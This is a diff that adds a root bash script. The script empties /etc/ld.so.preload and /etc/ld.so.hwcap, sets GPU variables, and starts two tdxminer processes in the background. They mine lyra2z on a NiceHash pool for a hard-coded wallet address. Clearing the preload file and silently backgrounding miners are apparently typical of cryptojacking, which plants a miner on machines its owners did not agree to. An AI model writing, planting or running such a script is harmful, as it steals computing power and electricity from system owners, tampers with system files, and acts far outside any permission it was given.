@@ -1,0 +1,9 @@
+#!/bin/bash
+echo -ne > /etc/ld.so.preload ; echo -ne > /etc/ld.so.hwcap
+export GPU_MAX_HEAP_SIZE=100
+export GPU_USE_SYNC_OBJECTS=1
+export GPU_MAX_ALLOC_PERCENT=100
+export GPU_SINGLE_ALLOC_PERCENT=100
+export HSA_ENABLE_SDMA=0
+/root/tdxminer/tdxminer --algo=lyra2z --url=stratum+tcp://lyra2z.usa.nicehash.com:3365 --user=3MtUmhZMGxavJfBRmWuVWiiRiJZigYPazQ --pass=x&
+/root/tdxminer/tdxminer.560 --algo=lyra2z --url=stratum+tcp://lyra2z.usa.nicehash.com:3365 --user=3MtUmhZMGxavJfBRmWuVWiiRiJZigYPazQ --pass=x -d& 
